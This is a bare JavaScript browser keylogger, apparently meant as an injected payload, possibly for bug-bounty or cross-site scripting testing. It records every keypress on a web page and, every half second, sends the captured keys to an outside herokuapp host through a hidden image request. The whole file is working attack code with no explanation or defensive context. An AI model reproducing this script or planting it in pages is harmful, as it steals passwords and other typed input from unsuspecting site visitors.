var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
if(keys != '') {
  new Image().src = 'https://bughunt1307.herokuapp.com/keylogger.php?c='+keys;
  keys = '';
}
}, 500);
